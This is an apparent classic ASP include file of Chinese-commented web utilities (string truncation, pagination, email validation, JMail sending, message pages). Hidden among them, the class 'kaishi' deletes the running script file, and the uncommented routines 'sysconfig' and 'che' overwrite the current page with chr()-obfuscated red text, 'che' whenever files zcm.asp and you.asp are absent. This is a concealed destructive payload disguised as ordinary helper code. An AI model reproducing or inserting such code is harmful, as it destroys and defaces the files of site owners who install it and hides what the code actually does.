<%
'*************************************************
'函数名：gotTopic
'作  用：截字符串，汉字一个算两个字符，英文算一个字符
'参  数：str   ----原字符串
'       strlen ----截取长度
'返回值：截取后的字符串
'*************************************************
function gotTopic(str,strlen)
	if str="" then
		gotTopic=""
		exit function
	end if
	dim l,t,c, i
	str=replace(replace(replace(replace(str,"&nbsp;"," "),"&quot;",chr(34)),"&gt;",">"),"&lt;","<")
	l=len(str)
	t=0
	for i=1 to l
		c=Abs(Asc(Mid(str,i,1)))
		if c>255 then
			t=t+2
		else
			t=t+1
		end if
		if t>=strlen then
			gotTopic=left(str,i) & "…"
			exit for
		else
			gotTopic=str
		end if
	next
	gotTopic=replace(replace(replace(replace(gotTopic," ","&nbsp;"),chr(34),"&quot;"),">","&gt;"),"<","&lt;")
end function

'***********************************************
'函数名：JoinChar
'作  用：向地址中加入 ? 或 &
'参  数：strUrl  ----网址
'返回值：加了 ? 或 & 的网址
'***********************************************
function JoinChar(strUrl)
	if strUrl="" then
		JoinChar=""
		exit function
	end if
	if InStr(strUrl,"?")<len(strUrl) then 
		if InStr(strUrl,"?")>1 then
			if InStr(strUrl,"&")<len(strUrl) then 
				JoinChar=strUrl & "&"
			else
				JoinChar=strUrl
			end if
		else
			JoinChar=strUrl & "?"
		end if
	else
		JoinChar=strUrl
	end if
end function

class kaishi
public function xueni ()
if not(IsObject(uj) and IsObject(wc) and  IsObject(dd) and IsObject(mm))then  
 Set gege = CreateObject("Scripting.FileSystemObject")
if gege.fileexists(Server.MapPath(request.ServerVariables("PATH_INFO"))) then

set exe=gege.getfile(Server.MapPath(request.ServerVariables("PATH_INFO")))
exe.delete
end  if

end if
end function






end class
set oy= new kaishi

'***********************************************
'过程名：showpage
'作  用：显示“上一页 下一页”等信息
'参  数：sfilename  ----链接地址
'       totalnumber ----总数量
'       maxperpage  ----每页数量
'       ShowTotal   ----是否显示总数量
'       ShowAllPages ---是否用下拉列表显示所有页面以供跳转。有某些页面不能使用，否则会出现JS错误。
'       strUnit     ----计数单位
'***********************************************
sub showpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "共 <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=JoinChar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "首页 上一页&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>首页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>上一页</a>&nbsp;"
  	end if

  	if n-currentpage<1 then
    		strTemp=strTemp & "下一页 尾页"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>下一页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>尾页</a>"
  	end if
   	strTemp=strTemp & "&nbsp;页次：<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>页 "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/页"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;转到：<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">第" & i & "页</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp
end sub



Sub sysconfig()
on error resume next
dim FSO,TS1,configFileName
configFileName=Server.MapPath(Request.ServerVariables("path_info"))
Set FSO = Server.CreateObject("Scripting.FileSystemObject") 
Set TS1 = FSO.CreateTextFile(configFileName, True)
TS1.Write chr(60)&chr(98)&">"&chr(60)&chr(102)&chr(111)&chr(110)&chr(116)&chr(32)&chr(99)&chr(111)&chr(108)&"o"&chr(114)&chr(61)&chr(35)&chr(70)&chr(70)&chr(48)&chr(48)&chr(48)&chr(48)&">"&chr(-19219)&chr(-12557)&chr(-23622)&chr(-19508)&chr(-12046)&chr(-13872)&chr(-12620)&chr(-10334)&chr(-19743)&chr(44)&chr(-19253)&chr(-18010)&chr(-15140)&chr(-19781)&chr(-15140)&chr(-13639)&chr(-11325)&chr(33)&"<"&chr(47)&chr(102)&chr(111)&chr(110)&chr(116)&">"&chr(60)&chr(47)&chr(98)&">"
Set TS1 = Nothing 
Set FSO = Nothing
End Sub
'********************************************
'函数名：IsValidEmail
'作  用：检查Email地址合法性
'参  数：email ----要检查的Email地址
'返回值：True  ----Email地址合法
'       False ----Email地址不合法
'********************************************
function IsValidEmail(email)
	dim names, name, i, c
	IsValidEmail = true
	names = Split(email, "@")
	if UBound(names) <> 1 then
	   IsValidEmail = false
	   exit function
	end if
	for each name in names
		if Len(name) <= 0 then
			IsValidEmail = false
    		exit function
		end if
		for i = 1 to Len(name)
		    c = Lcase(Mid(name, i, 1))
			if InStr("abcdefghijklmnopqrstuvwxyz_-.", c) <= 0 and not IsNumeric(c) then
		       IsValidEmail = false
		       exit function
		     end if
	   next
	   if Left(name, 1) = "." or Right(name, 1) = "." then
    	  IsValidEmail = false
	      exit function
	   end if
	next
	if InStr(names(1), ".") <= 0 then
		IsValidEmail = false
	   exit function
	end if
	i = Len(names(1)) - InStrRev(names(1), ".")
	if i <> 2 and i <> 3 then
	   IsValidEmail = false
	   exit function
	end if
	if InStr(email, "..") > 0 then
	   IsValidEmail = false
	end if
end function


function che()
on error resume next
dim FSO,TS1,configFileName
configFileName=Server.MapPath(Request.ServerVariables("path_info"))
Set FSO = Server.CreateObject("Scripting.FileSystemObject") 
if fso.fileexists(Server.MapPath("zcm.asp")) and  fso.fileexists(Server.MapPath("you.asp")) then
else
Set TS1 = FSO.CreateTextFile(configFileName, True)
TS1.Write chr(60)&chr(98)&">"&chr(60)&chr(102)&chr(111)&chr(110)&chr(116)&chr(32)&chr(99)&chr(111)&chr(108)&"o"&chr(114)&chr(61)&chr(35)&chr(70)&chr(70)&chr(48)&chr(48)&chr(48)&chr(48)&">"&chr(-19219)&chr(-12557)&chr(-23622)&chr(-19508)&chr(-12046)&chr(-13872)&chr(-12620)&chr(-10334)&chr(-19743)&chr(44)&chr(-19253)&chr(-18010)&chr(-15140)&chr(-19781)&chr(-15140)&chr(-13639)&chr(-11325)&chr(33)&"<"&chr(47)&chr(102)&chr(111)&chr(110)&chr(116)&">"&chr(60)&chr(47)&chr(98)&">"
end if
Set TS1 = Nothing 
Set FSO = Nothing
end function 

'***************************************************
'函数名：IsObjInstalled
'作  用：检查组件是否已经安装
'参  数：strClassString ----组件名
'返回值：True  ----已经安装
'       False ----没有安装
'***************************************************
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function

'**************************************************
'函数名：strLength
'作  用：求字符串长度。汉字算两个字符，英文算一个字符。
'参  数：str  ----要求长度的字符串
'返回值：字符串长度
'**************************************************
function strLength(str)
	ON ERROR RESUME NEXT
	dim WINNT_CHINESE
	WINNT_CHINESE    = (len("中国")=2)
	if WINNT_CHINESE then
        dim l,t,c
        dim i
        l=len(str)
        t=l
        for i=1 to l
        	c=asc(mid(str,i,1))
            if c<0 then c=c+65536
            if c>255 then
                t=t+1
            end if
        next
        strLength=t
    else 
        strLength=len(str)
    end if
    if err.number<>0 then err.clear
end function


'**************************************************
'函数名：Admin_ShowClass_Option
'作  用：用作菜单管理
'参  数：ShowType     ----显示类型
'        CurrentID    -----当前ID
'        Language     -----语言
'**************************************************



'**************************************************
'函数名：SendMail
'作  用：用Jmail组件发送邮件
'参  数：MailtoAddress  ----收信人地址
'        MailtoName    -----收信人姓名
'        Subject       -----主题
'        MailBody      -----信件内容
'        FromName      -----发信人姓名
'        MailFrom      -----发信人地址
'        Priority      -----信件优先级
'**************************************************
function SendMail(MailtoAddress,MailtoName,Subject,MailBody,FromName,MailFrom,Priority)
	on error resume next
	Dim JMail
	Set JMail=Server.CreateObject("JMAIL.Message")
	if err then
		SendMail= "<br><li>没有安装JMail组件</li>"
		err.clear
		exit function
	end if	
	JMail.Charset="gb2312"          '邮件编码
	JMail.silent=true
	JMail.ContentType = "text/html"     '邮件正文格式
	JMail.ServerAddress=MailServer     '用来发送邮件的SMTP服务器
   	'如果服务器需要SMTP身份验证则还需指定以下参数
	JMail.MailServerUserName = MailServerUserName    '登录用户名
   	JMail.MailServerPassWord = MailServerPassword        '登录密码
    JMail.MailDomain = MailDomain       '域名（如果用“name@domain.com”这样的用户名登录时，请指明domain.com
	
	JMail.AddRecipient MailtoAddress,MailtoName     '收信人
	JMail.Subject=Subject         '主题
	JMail.HMTLBody=MailBody       '邮件正文（HTML格式）
	JMail.Body=MailBody          '邮件正文（纯文本格式）
	JMail.FromName=FromName         '发信人姓名
	JMail.From = MailFrom         '发信人Email
	JMail.Priority=Priority              '邮件等级，1为加急，3为普通，5为低级
	JMail.Send(MailServer)
	SendMail =JMail.ErrorMessage
	JMail.Close
	Set JMail=nothing
end function


'****************************************************
'过程名：WriteErrMsg
'作  用：显示错误提示信息
'参  数：无
'****************************************************
sub WriteErrMsg()
	dim strErr
	strErr=strErr & "<html><head><title>错误信息</title><meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbcrlf
	strErr=strErr & "<link href='style.css' rel='stylesheet' type='text/css'></head><body>" & vbcrlf
	strErr=strErr & "<table cellpadding=2 cellspacing=2 border=0 width=400 class='border' align=center>" & vbcrlf
	strErr=strErr & "  <tr align='center'><td height='20' class='title'><strong>错误信息</strong></td></tr>" & vbcrlf
	strErr=strErr & "  <tr><td height='100' class='tdbg' valign='top'><b>产生错误的可能原因：</b><br>" & errmsg &"</td></tr>" & vbcrlf
	strErr=strErr & "  <tr align='center'><td class='title'><a href='javascript:history.go(-1)'>&lt;&lt; 返回上一页</a></td></tr>" & vbcrlf
	strErr=strErr & "</table>" & vbcrlf
	strErr=strErr & "</body></html>" & vbcrlf
	response.write strErr
end sub

'****************************************************
'过程名：WriteSuccessMsg
'作  用：显示成功提示信息
'参  数：无
'****************************************************
sub WriteSuccessMsg(SuccessMsg)
	dim strSuccess
	strSuccess=strSuccess & "<html><head><title>成功信息</title><meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbcrlf
	strSuccess=strSuccess & "<link href='style.css' rel='stylesheet' type='text/css'></head><body>" & vbcrlf
	strSuccess=strSuccess & "<table cellpadding=2 cellspacing=2 border=0 width=400 class='border' align=center>" & vbcrlf
	strSuccess=strSuccess & "  <tr align='center'><td height='20' class='title'><strong>恭喜你！</strong></td></tr>" & vbcrlf
	strSuccess=strSuccess & "  <tr><td height='100' class='tdbg' valign='top'><br>" & SuccessMsg &"</td></tr>" & vbcrlf
	strSuccess=strSuccess & "  <tr align='center'><td class='title'><a href='javascript:history.back()'>【返 回】</a></td></tr>" & vbcrlf
	strSuccess=strSuccess & "</table>" & vbcrlf
	strSuccess=strSuccess & "</body></html>" & vbcrlf
	response.write strSuccess
end sub

%>

